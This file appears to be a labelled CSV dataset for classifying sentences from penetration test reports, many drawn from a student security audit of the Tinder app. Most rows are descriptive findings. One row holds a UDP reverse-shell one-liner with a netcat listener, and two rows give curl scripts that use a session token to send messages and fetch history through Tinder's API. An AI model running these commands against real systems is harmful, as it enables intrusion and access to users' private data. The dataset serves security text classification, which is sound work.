text,label,clean_text
"The user has to supply some information before using the app. This includes a Facebook profile API credentials and eventually even GPS information. The information that can be collected from the Facebook profile could be valuable for eavesdroppers or third parties. Information like GPS, the actual location of the end user.",Background Information,the user has to supply some information before using the app this includes a facebook profile api credentials and eventually even gps information the information that can be collected from the facebook profile could be valuable for eavesdroppers or third parties information like gps the actual location of the end user
Deployed a custom SSH daemon configured to log credentials and allow attacker access through a hidden port.,Post - Exploitation,deployed a custom ssh daemon configured to log credentials and allow attacker access through a hidden port
"Using credentials retrieved from FTP, login was successful on SSH. Privilege escalation checks revealed a SUID binary vulnerable to buffer overflow.",Privilege Escalation,using credentials retrieved from ftp login was successful on ssh privilege escalation checks revealed a suid binary vulnerable to buffer overflow
"The application returned full stack traces when invalid input was submitted, revealing framework and version information to the user.",Information Disclosure,the application returned full stack traces when invalid input was submitted revealing framework and version information to the user
"URL_MEDIA_BASE = ""/media"";URL_MEDIA = ""https://content.gotinder.com"" + URL_MEDIA_BASE; URL_USER_BASE = URL_BASE + ""/user/""; URL_AUTH = URL_BASE + ""/auth""; URL_MATCHES = URL_USER_BASE + ""matches/""; URL_PING = URL_USER_BASE + ""ping""; URL_PROFILE = URL_USER_BASE + ""profile""; URL_RECS = URL_USER_BASE + ""recs""; URL_UPDATES = URL_BASE + ""/updates""; URL_REGISTER_PUSH = URL_BASE + ""/device/android""; URL_DESTINATIONS_LIST = URL_BASE + ""/destinations""; URL_DESTINATION = URL_BASE + ""/destinations/""; URL_REPORT = URL_BASE + ""/report/""; URL_LIKE_ADJUNCT = ""/like""; URL_PASS_ADJUNCT = ""/pass"";",Discovery,url_media_base mediaurl_media httpscontentgotindercom url_media_base url_user_base url_base user url_auth url_base auth url_matches url_user_base matches url_ping url_user_base ping url_profile url_user_base profile url_recs url_user_base recs url_updates url_base updates url_register_push url_base deviceandroid url_destinations_list url_base destinations url_destination url_base destinations url_report url_base report url_like_adjunct like url_pass_adjunct pass
"A login page error message disclosed whether the username or password was incorrect, aiding user enumeration.",Information Disclosure,a login page error message disclosed whether the username or password was incorrect aiding user enumeration
### Objective,Formatting,objective
"Encryption keys for each session were derived from the user’s username and timestamp, enabling attackers to precompute likely key values.",Crypto Misuse,encryption keys for each session were derived from the users username and timestamp enabling attackers to precompute likely key values
Enumerated SMB shares using smbclient and found accessible shares.,Discovery,enumerated smb shares using smbclient and found accessible shares
"Tinder sends highly private information over the network. The information
that is transferred to Kontagent contains the GPS location, gender, age,
sexual preference, user number and Tinder ID. This can be intercepted by
an eavesdropper, since the traffic is not encrypted.",Exploitation,tinder sends highly private information over the network the information that is transferred to kontagent contains the gps location gender age sexual preference user number and tinder id this can be intercepted by an eavesdropper since the traffic is not encrypted
It is recommended to implement network segmentation between internal and external-facing services to reduce blast radius of successful attacks.,Support - Recommendation,it is recommended to implement network segmentation between internal and externalfacing services to reduce blast radius of successful attacks
Cached files on device included screenshots of user activity logs and partial authentication tokens in plain text.,Exploitation,cached files on device included screenshots of user activity logs and partial authentication tokens in plain text
3 Materials and Methods 4,Formatting,3 materials and methods 4
"The purpose of the static analysis is to extract some information on how Tinder is implemented. We focus on which libraries are used, how communication is handled and if there are any obvious flaws in the implementation.
We will also attempt to extract the structure of their API for later use.",Discovery,the purpose of the static analysis is to extract some information on how tinder is implemented we focus on which libraries are used how communication is handled and if there are any obvious flaws in the implementation we will also attempt to extract the structure of their api for later use
" Custom error messages
are highly recommended, as it becomes more challenging for the
attacker to exploit a given weakness if errors are not being
presented back to them.",Information Disclosure,custom error messages are highly recommended as it becomes more challenging for the attacker to exploit a given weakness if errors are not being presented back to them
We discovered the application retrieves history from the server by making a call to api.gotinder.com.,Exploitation,we discovered the application retrieves history from the server by making a call to apigotindercom
Exploited deserialization flaw in the application -s API endpoint to execute arbitrary commands on the backend server.,Exploitation,exploited deserialization flaw in the application s api endpoint to execute arbitrary commands on the backend server
3.2 Network traffic . . . . . . . . . . . . . . . . . . . . . . . . . . 4,Formatting,32 network traffic 4
"Timing variations were observed in the password comparison logic, indicating that a timing side-channel could be exploited to infer valid characters.",Discovery,timing variations were observed in the password comparison logic indicating that a timing sidechannel could be exploited to infer valid characters
"Malicious link in a fake invoice email was clicked by an employee, initiating malware download.",Operational TTPs,malicious link in a fake invoice email was clicked by an employee initiating malware download
"Data retention policies allow for indefinite storage of logs containing PII without proper encryption or access controls, increasing the risk of long-term data exposure.",Policy,data retention policies allow for indefinite storage of logs containing pii without proper encryption or access controls increasing the risk of longterm data exposure
" The service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems. This is valuable for an attacker as it provides detailedinformation on potential attack vectors into a system. Understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test. In some cases, some ports may not be listed.",Discovery,the service enumeration portion of a penetration test focuses on gathering information about what services are alive on a system or systems this is valuable for an attacker as it provides detailedinformation on potential attack vectors into a system understanding what applications are running on the system gives an attacker needed information before performing the actual penetration test in some cases some ports may not be listed
"Pages could lie about their URL, tricking the app into giving a password to the wrong domain.",Exploitation,pages could lie about their url tricking the app into giving a password to the wrong domain
"Insufficient input validation allows special characters to be injected into SQL queries, indicating a vulnerability to SQL injection.",Implementation Flaw,insufficient input validation allows special characters to be injected into sql queries indicating a vulnerability to sql injection
"Dating apps are common place in society. Many dating apps include the option to contact matched users and send text messages or images. Due to the amount of personal information potentially involved in the matchmaking process this a prime target for identity theft. If an app or service deals with personal information, it has to ensure the security of this private information. Since the Tinder application has a lot of users, it would be interesting to check this security.",Background Information,dating apps are common place in society many dating apps include the option to contact matched users and send text messages or images due to the amount of personal information potentially involved in the matchmaking process this a prime target for identity theft if an app or service deals with personal information it has to ensure the security of this private information since the tinder application has a lot of users it would be interesting to check this security
"Keys were derived by concatenating the password and username directly (e.g., `key = SHA256(password + username)`), bypassing standard key derivation libraries and lacking salting or iteration controls.",Crypto Misuse,keys were derived by concatenating the password and username directly eg key sha256password username bypassing standard key derivation libraries and lacking salting or iteration controls
Inspecting our logged traffic we located some legitimate chat traffic in order to test whether we could automate the chat functionality. For this we used 3 parties: *The user *The chat partner *The third party,Exploitation,inspecting our logged traffic we located some legitimate chat traffic in order to test whether we could automate the chat functionality for this we used 3 parties the user the chat partner the third party
Attacker exploited an outdated Apache Struts installation to gain shell access via a crafted HTTP request.,Exploitation,attacker exploited an outdated apache struts installation to gain shell access via a crafted http request
2 Related Work 3,Formatting,2 related work 3
"Data gathered by third party API's can be gathered during the use of Tinder.
When the Tinder account is deleted, this information will remain stored on
with the third parties. The stored information cannot be deleted. Third
parties can sell or use this information for targeted add. All of this is
according to Tinders privacy statement the user agreed upon.",Exploitation,data gathered by third party apis can be gathered during the use of tinder when the tinder account is deleted this information will remain stored on with the third parties the stored information cannot be deleted third parties can sell or use this information for targeted add all of this is according to tinders privacy statement the user agreed upon
"Hardcoded database credentials were found in the source code repository, posing a high risk of credential leakage.",Implementation Flaw,hardcoded database credentials were found in the source code repository posing a high risk of credential leakage
Exposed Jenkins dashboard allowed anonymous command execution on build nodes.,Exploitation,exposed jenkins dashboard allowed anonymous command execution on build nodes
"RCE achieved by uploading a malicious PHP file through an unrestricted file upload form, then accessing it via the web.",Exploitation,rce achieved by uploading a malicious php file through an unrestricted file upload form then accessing it via the web
An attacker exploited a misconfigured GitLab runner to gain shell access on the build environment.,Exploitation,an attacker exploited a misconfigured gitlab runner to gain shell access on the build environment
"The system used a single iteration of SHA-1 for password storage instead of a dedicated key derivation function like PBKDF2, bcrypt, or scrypt. This makes brute-force attacks significantly more feasible.",Crypto Misuse,the system used a single iteration of sha1 for password storage instead of a dedicated key derivation function like pbkdf2 bcrypt or scrypt this makes bruteforce attacks significantly more feasible
5 Conclusion 13,Formatting,5 conclusion 13
The code to prompt the user if they want to migrate always runs due to a logic bug. Not a security issue.,Background Information,the code to prompt the user if they want to migrate always runs due to a logic bug not a security issue
"While enumerating table data, John was able to successfully extract
the database root account login and password credentials that were
unencrypted that also matched username and password accounts for the
administrative user account on the system and John was able to log in
remotely using RDP. This allowed for a successful breach of the
operating system as well as all data contained on the system.",Credential Access,while enumerating table data john was able to successfully extract the database root account login and password credentials that were unencrypted that also matched username and password accounts for the administrative user account on the system and john was able to log in remotely using rdp this allowed for a successful breach of the operating system as well as all data contained on the system
Disabled Windows Defender via registry edits before payload deployment.,Operational TTPs,disabled windows defender via registry edits before payload deployment
## High-Level Summary,Formatting,highlevel summary
We also found that the API is adding an X-Auth-Token header to each request with a token retrieved from the /auth endpoint.,Discovery,we also found that the api is adding an xauthtoken header to each request with a token retrieved from the auth endpoint
User credentials were visible in the browsers address bar after a failed login attempt.,Information Disclosure,user credentials were visible in the browsers address bar after a failed login attempt
**Vulnerability Fix**: The SMB should be configured with credentials and guest enumeration should be disabled.,Support - Recommendation,vulnerability fix the smb should be configured with credentials and guest enumeration should be disabled
"The attacker deployed a persistent reverse shell that survived system reboots, indicating a post-exploitation mechanism using systemd services.",Post - Exploitation,the attacker deployed a persistent reverse shell that survived system reboots indicating a postexploitation mechanism using systemd services
"Pages could lie about their URL, tricking the app into giving a password to the wrong domain.",Exploitation,pages could lie about their url tricking the app into giving a password to the wrong domain
22-Dec-13,Formatting,22dec13
"The API failed to validate the initialization vector (IV) size before processing decryption, leading to truncated inputs that weakened cryptographic strength.",Crypto Misuse,the api failed to validate the initialization vector iv size before processing decryption leading to truncated inputs that weakened cryptographic strength
The attacker altered log retention configurations and deleted key audit logs to obscure post-compromise activity.,Post - Exploitation,the attacker altered log retention configurations and deleted key audit logs to obscure postcompromise activity
"User credentials and session tokens were stored unencrypted in browser localStorage, accessible via any loaded script.",Exploitation,user credentials and session tokens were stored unencrypted in browser localstorage accessible via any loaded script
First we used the Burp suite[5]. This program sat as a proxy between client and server but allowed the user to change the data in the middle. This would allow us to change request and response data without having to create a placeholder server. However it turned out that Burp did not have the option to run completely transparent and serve proper SSL certificates.,Discovery,first we used the burp suite5 this program sat as a proxy between client and server but allowed the user to change the data in the middle this would allow us to change request and response data without having to create a placeholder server however it turned out that burp did not have the option to run completely transparent and serve proper ssl certificates
9https://android.googlesource.com/platform/frameworks/volley,Support - Tool Reference,9httpsandroidgooglesourcecomplatformframeworksvolley
Tinder is a dating app that is being used by many users on a global scale. The Tinder application requires a Facebook profile as well as GPS location to function properly. Tinder claims not to share this information with other users. Since personal information like sexual preferences or your location is highly sensitive data it should be properly secured. This audit focuses on testing whether or not Tinder uses avail- able technologies to withstand common attacks. Whilst most known leaks in Tinder appear to no longer be around there are still some points of concern. It turns out that there is an insecure connection which sends user preferences and GPS data to an analytics company. ,Exploitation,tinder is a dating app that is being used by many users on a global scale the tinder application requires a facebook profile as well as gps location to function properly tinder claims not to share this information with other users since personal information like sexual preferences or your location is highly sensitive data it should be properly secured this audit focuses on testing whether or not tinder uses avail able technologies to withstand common attacks whilst most known leaks in tinder appear to no longer be around there are still some points of concern it turns out that there is an insecure connection which sends user preferences and gps data to an analytics company
"A cron job running every minute as root was discovered to execute a shell script located in a directory with global write permissions, which enabled privilege escalation by overwriting the script.",Privilege Escalation,a cron job running every minute as root was discovered to execute a shell script located in a directory with global write permissions which enabled privilege escalation by overwriting the script
"Steps to reproduce: The operating system was different from the known public exploit. A rewritten exploit was needed in order for successful code execution to occur. Once the exploit was rewritten, a targeted attack was performed on the system which gave John full administrative access over the system.",Exploitation,steps to reproduce the operating system was different from the known public exploit a rewritten exploit was needed in order for successful code execution to occur once the exploit was rewritten a targeted attack was performed on the system which gave john full administrative access over the system
The encryption password is derived from the master password with a constant salt.,Crypto Misuse,the encryption password is derived from the master password with a constant salt
 The network traffic was analyzed by using a Man in the Middle(MitM) attack. To do this we setup an access-point using a laptop and airbase-ng2. The access point would then forward all requests via iptables to our proxy.,Discovery,the network traffic was analyzed by using a man in the middlemitm attack to do this we setup an accesspoint using a laptop and airbaseng2 the access point would then forward all requests via iptables to our proxy
"The initial scanning revealed several services running on open ports:
- Port 21 (FTP)
- Port 22 (SSH)
- Port 80 (HTTP)",Discovery,the initial scanning revealed several services running on open ports port 21 ftp port 22 ssh port 80 http
"Due to a race condition, a password could be inserted into the wrong browser tab.",Implementation Flaw,due to a race condition a password could be inserted into the wrong browser tab
"**PoC**:
UDP reverse shell command to add to `/tmp/clean.sh`:

```bash
sh -i >& /dev/udp/10.0.0.1/4242 0>&1
```

while listener is running as

```bash
nc -u -lvp 4242
```",Post - Exploitation,poc udp reverse shell command to add to tmpcleansh bash sh i devudp100014242 01 while listener is running as bash nc u lvp 4242
" This information will most likely be stored indefinitely and used for legitimate purposed as advertised and permitted by the terms, conditions and privacy statements of Tinder. ",Background Information,this information will most likely be stored indefinitely and used for legitimate purposed as advertised and permitted by the terms conditions and privacy statements of tinder
"What users might not realize is the insecure channel used for this, enabling a motivated third party to passively inspect and log it.",Exploitation,what users might not realize is the insecure channel used for this enabling a motivated third party to passively inspect and log it
A Nikto scan was run against the HTTP service revealing outdated software and potential misconfigurations.,Discovery,a nikto scan was run against the http service revealing outdated software and potential misconfigurations
"One of the first attacks tried on the Tinder API was to check if we could exchange a third party Facebook token for a Tinder session token. We send a fully authorized token, created from the Facebook Graph API Explorer11.",Exploitation,one of the first attacks tried on the tinder api was to check if we could exchange a third party facebook token for a tinder session token we send a fully authorized token created from the facebook graph api explorer11
"Initial Access - Buffer Overflow
Vulnerability Explanation: Ability Server 2.34 is subject to a buffer overflow vulnerability in STOR field. Attackers can use this vulnerability to cause arbitrary remote code execution and take completely control over the system.",Exploitation,initial access buffer overflow vulnerability explanation ability server 234 is subject to a buffer overflow vulnerability in stor field attackers can use this vulnerability to cause arbitrary remote code execution and take completely control over the system
"There is no formal process in place for security review of third-party vendor software, leaving the organization vulnerable to unvetted supply chain risks.",Policy,there is no formal process in place for security review of thirdparty vendor software leaving the organization vulnerable to unvetted supply chain risks
Two processes modifying the same resource due to missing synchronization.,Implementation Flaw,two processes modifying the same resource due to missing synchronization
 Facebook is used for user registration and log in. The app retrieves an authorized token from the library which is used to log in with the Tinder backend.,Discovery,facebook is used for user registration and log in the app retrieves an authorized token from the library which is used to log in with the tinder backend
Regularly rotating API keys and secrets can help minimize risk from long-lived credential exposure.,Support - Recommendation,regularly rotating api keys and secrets can help minimize risk from longlived credential exposure
" After having concluded our offline analysis we started our online analysis, using our test setup as described in section 3.2.1. During this process we had two test users run the app on several occasions, both instructions to generate a representative stream of requests for a complete analysis of ap- plication behavior and possible weaknesses. We inspected the logs collected to investigate where certain data was sent, whether it was secured in transit, and whether there were other feature worth investigating.",Discovery,after having concluded our offline analysis we started our online analysis using our test setup as described in section 321 during this process we had two test users run the app on several occasions both instructions to generate a representative stream of requests for a complete analysis of ap plication behavior and possible weaknesses we inspected the logs collected to investigate where certain data was sent whether it was secured in transit and whether there were other feature worth investigating
"User session was validated before checking file permissions, allowing unauthorized access.",Implementation Flaw,user session was validated before checking file permissions allowing unauthorized access
Cleanup was performed by removing the cronjob and clearing shell history to avoid detection.,Post - Exploitation,cleanup was performed by removing the cronjob and clearing shell history to avoid detection
"#### Initial Access - Anonymous SMB share leads to Wordpress RCE

**Vulnerability Explanation**: The SMB server is not protected with the password and has some
sensitive information like credentials stored. Which leads to RCE
from wordpress theme editor.


**Severity**: Critical
",Exploitation,initial access anonymous smb share leads to wordpress rce vulnerability explanation the smb server is not protected with the password and has some sensitive information like credentials stored which leads to rce from wordpress theme editor severity critical
An improperly secured GCP bucket exposed confidential financial records to the public.,Operational TTPs,an improperly secured gcp bucket exposed confidential financial records to the public
"By analyzing CPU cache behavior during repeated operations, the attacker could identify memory access patterns linked to sensitive information.",Discovery,by analyzing cpu cache behavior during repeated operations the attacker could identify memory access patterns linked to sensitive information
4.1.3 Local storage . . . . . . . . . . . . . . . . . . . . . . . 7,Formatting,413 local storage 7
"The European law is, however, more strict of securing the information in
transit. This is described in the 95/46/EC[10] regulation. It says that the
developer of the application must take care of security measurements to
ensure the safe transit of data. This data must be protected against:
 Accidental or unlawful destruction
 Loss of data
 Alteration of data
 Unauthorized disclosure or access
 Other forms of unlawful processing
The interesting part of these criteria is that the developer must also
ensure that the data is not accessible. However the API that Tinder uses
(Kontagent) does not make use of any encryption but merely uses a base64
encoding. This is not considered to be good encryption.",Policy,the european law is however more strict of securing the information in transit this is described in the 9546ec10 regulation it says that the developer of the application must take care of security measurements to ensure the safe transit of data this data must be protected against accidental or unlawful destruction loss of data alteration of data unauthorized disclosure or access other forms of unlawful processing the interesting part of these criteria is that the developer must also ensure that the data is not accessible however the api that tinder uses kontagent does not make use of any encryption but merely uses a base64 encoding this is not considered to be good encryption
"John added administrator and root level accounts on all systems compromised. In
addition to the administrative/root access, a Metasploit meterpreter service
was installed on the machine to ensure that additional access could be
established.",Post - Exploitation,john added administrator and root level accounts on all systems compromised in addition to the administrativeroot access a metasploit meterpreter service was installed on the machine to ensure that additional access could be established
"Sent phishing email with payload, user opened link.",Operational TTPs,sent phishing email with payload user opened link
"Detected Exim mail server version 4.87, which is susceptible to CVE-2019-15846, allowing remote command execution without authentication.",Vulnerability - Known CVE,detected exim mail server version 487 which is susceptible to cve201915846 allowing remote command execution without authentication
"**Steps to reproduce**: Ran the initial service scan John discovered that this host is called
Sehnzi. Smbclient was used to interact on the port 445 to get the
passwords.txt file from SMB share shenzi and",Discovery,steps to reproduce ran the initial service scan john discovered that this host is called sehnzi smbclient was used to interact on the port 445 to get the passwordstxt file from smb share shenzi and
"Sensitive data, including database backups and plaintext credentials, were located in /var/backups and /etc/passwd respectively.",Exploitation,sensitive data including database backups and plaintext credentials were located in varbackups and etcpasswd respectively
### Recommendations,Formatting,recommendations
References 14,Formatting,references 14
"#!/bin/sh
### Replace : With
### 888888888888888888888888 : Match ID
### 11111111-2222-3333-4444-555555555555 : Currently valid token
### Tinder testbericht 4 : A message approved by the token's owner
curl -v ""https://api.gotinder.com/user/matches/888888888888888888888888"" \
-H ""X-Auth-Token: 11111111-2222-3333-4444-555555555555"" \
-A ""Tinder Android Version 2.0.1"" \
-H ""Content-Type: application/json; charset=utf-8"" \
-H ""Accept-Encoding: gzip"" \
-d '{""message"":""Tinder testbericht""}'",Exploitation,binsh replace with 888888888888888888888888 match id 11111111222233334444555555555555 currently valid token tinder testbericht 4 a message approved by the tokens owner curl v httpsapigotindercomusermatches888888888888888888888888 h xauthtoken 11111111222233334444555555555555 a tinder android version 201 h contenttype applicationjson charsetutf8 h acceptencoding gzip d messagetinder testbericht
"#!/bin/sh
### Replace : With
### 11111111-2222-3333-4444-555555555555 : Currently valid token
### 2000-12-09T14:55:30.356Z : Earliest time the history includes
curl -v ""https://api.gotinder.com/updates"" \
-H ""X-Auth-Token: 11111111-2222-3333-4444-555555555555"" \
-A ""Tinder Android Version 2.0.1"" \
-H ""Content-Type: application/json; charset=utf-8"" \
-d '{""last_activity_date"":""2000-12-09T14:55:30.356Z""}'",Credential Access,binsh replace with 11111111222233334444555555555555 currently valid token 20001209t145530356z earliest time the history includes curl v httpsapigotindercomupdates h xauthtoken 11111111222233334444555555555555 a tinder android version 201 h contenttype applicationjson charsetutf8 d last_activity_date20001209t145530356z
"What users might not realize is the insecure channel used for this, enabling a motivated third party to passively inspect and log it.",Exploitation,what users might not realize is the insecure channel used for this enabling a motivated third party to passively inspect and log it
"**Steps to reproduce**: We can find the script by running a LinEnum enumeration suite on the system. Since the script
is written in bash and it can be changed, we can edit it and add a reverse shell command.
When the script is executed by cron, we'll get a reverse shell under root user.",Exploitation,steps to reproduce we can find the script by running a linenum enumeration suite on the system since the script is written in bash and it can be changed we can edit it and add a reverse shell command when the script is executed by cron well get a reverse shell under root user
Leveraged Kerberoasting to request service tickets and crack passwords offline.,Credential Access,leveraged kerberoasting to request service tickets and crack passwords offline
The web admin interface for the camera system was accessible via HTTP and used the default vendor credentials (`admin:admin`). These credentials allowed unrestricted configuration changes and full video access.,Credential Access,the web admin interface for the camera system was accessible via http and used the default vendor credentials adminadmin these credentials allowed unrestricted configuration changes and full video access
Remotely scheduled a task using schtasks.exe to gain shell access on a second machine.,Operational TTPs,remotely scheduled a task using schtasksexe to gain shell access on a second machine
"### Target #1 - 192.168.x.3

#### Service Enumeration

##### Port Scan Results

|IP Address|Ports Open|
|---|---|
|192.168.x.1|**TCP**: 80, 443<br/>**UDP**: 1433, 3389|",Discovery,target 1 192168x3 service enumeration port scan results ip addressports open 192168x1tcp 80 443brudp 1433 3389
The encryption key is derived from the master key with a fixed salt; more secure design needed.,Crypto Misuse,the encryption key is derived from the master key with a fixed salt more secure design needed
" Our research focuses on several particular attack vectors against the plat- form. We will analyze several aspects of the application. User authentica-tion, authentication of API server(s), possible user-base enumeration, and leaking of information via side channels. We will investigate this by using a combination of static offline analysis of the program code and analysis of live network traffic.",Discovery,our research focuses on several particular attack vectors against the plat form we will analyze several aspects of the application user authentication authentication of api servers possible userbase enumeration and leaking of information via side channels we will investigate this by using a combination of static offline analysis of the program code and analysis of live network traffic
"The application encrypted data using AES-128, then applied a second, independent encryption layer using a custom XOR cipher. This provided no additional security benefit and introduced unnecessary complexity and potential for error.",Crypto Misuse,the application encrypted data using aes128 then applied a second independent encryption layer using a custom xor cipher this provided no additional security benefit and introduced unnecessary complexity and potential for error
"Tinder requires its users to register and log in using Facebook. Facebook log in uses a token which, once generated, can be used by any interested party. As such it might be possible to log a user in with a third party Facebook token. To check this we will attempt a log in request to the API of Tinder and replace their Facebook token with one of our own. If Tinder does not verify whether or not the supplied token is created using their own Facebook app this will allow any Facebook app owner to attempt to log in to Tinder for a user.",Discovery,tinder requires its users to register and log in using facebook facebook log in uses a token which once generated can be used by any interested party as such it might be possible to log a user in with a third party facebook token to check this we will attempt a log in request to the api of tinder and replace their facebook token with one of our own if tinder does not verify whether or not the supplied token is created using their own facebook app this will allow any facebook app owner to attempt to log in to tinder for a user
 We will first discuss the materials and methods we used to research the Tinder application. We will then discuss the analysis we did on the Tinder application. eg. The offline and onlineanalysis. We will discuss certain,Background Information,we will first discuss the materials and methods we used to research the tinder application we will then discuss the analysis we did on the tinder application eg the offline and onlineanalysis we will discuss certain
"OpenSSL version 1.0.2k detected, which is affected by CVE-2016-2107, allowing padding oracle attacks on AES CBC cipher.",Vulnerability - Known CVE,openssl version 102k detected which is affected by cve20162107 allowing padding oracle attacks on aes cbc cipher
Login page accepted admin:admin as default credentials.,Credential Access,login page accepted adminadmin as default credentials
Abstract,Formatting,abstract
4.1.2 API resources . . . . . . . . . . . . . . . . . . . . . . . 6,Formatting,412 api resources 6
"Apphance, Crittercism and Kontagent are all products related to app usage analysis. Apphance seems to be dedicated to analysis of app crashes. Since the app did not crash during testing we have not intercepted any re- quest of Apphance. Crittercism and Kontagent are used for usage analytics. Crittercism seems to be focused on application usage and device statistics whilst Kontagent seems focused on user details and interactions.",Discovery,apphance crittercism and kontagent are all products related to app usage analysis apphance seems to be dedicated to analysis of app crashes since the app did not crash during testing we have not intercepted any re quest of apphance crittercism and kontagent are used for usage analytics crittercism seems to be focused on application usage and device statistics whilst kontagent seems focused on user details and interactions
"Removed all known artifacts, including payload binaries and temporary logs from `/tmp` and `/var/log`, to minimize the footprint of exploitation.",Post - Exploitation,removed all known artifacts including payload binaries and temporary logs from tmp and varlog to minimize the footprint of exploitation
"If the Storage Provider URL is empty, an empty salt is used without warning.",Crypto Misuse,if the storage provider url is empty an empty salt is used without warning
" Decompilation of the Tinder APK file provided some clear insights for fur- ther research. It provided us with a list of libraries used by Tinder, API endpoints, and some clarification on the authentication scheme used.",Discovery,decompilation of the tinder apk file provided some clear insights for fur ther research it provided us with a list of libraries used by tinder api endpoints and some clarification on the authentication scheme used
Tinder must comply with laws governing sensitive data. The Netherlands has a law called 'Wet bescherming persoonsgegevens'.,Policy,tinder must comply with laws governing sensitive data the netherlands has a law called wet bescherming persoonsgegevens
"Keys were generated by reversing the user's birthdate and concatenating it with a static site-wide string, without salting or stretching.",Crypto Misuse,keys were generated by reversing the users birthdate and concatenating it with a static sitewide string without salting or stretching
Moved laterally using PsExec after dumping credentials from lsass.exe.,Operational TTPs,moved laterally using psexec after dumping credentials from lsassexe
 #### Privilege Escalation - MySQL Injection,Discovery,privilege escalation mysql injection
6https://www.crittercism.com/,Support - Tool Reference,6httpswwwcrittercismcom
"Security training is not mandated by company policy for contractors, despite their access to internal systems. This oversight creates an entry point for social engineering attacks.",Policy,security training is not mandated by company policy for contractors despite their access to internal systems this oversight creates an entry point for social engineering attacks
4.3.3 Privacy concerns . . . . . . . . . . . . . . . . . . . . . 12,Formatting,433 privacy concerns 12
3http://mitmproxy.org,Support - Tool Reference,3httpmitmproxyorg
We also saw a large number of requests going to non-HTTPS endpoints. Closer inspection revealed the following endpoints to receive non-encrypted requests: images.gotinder.com and api.geo.kontagent.net.,Exploitation,we also saw a large number of requests going to nonhttps endpoints closer inspection revealed the following endpoints to receive nonencrypted requests imagesgotindercom and apigeokontagentnet
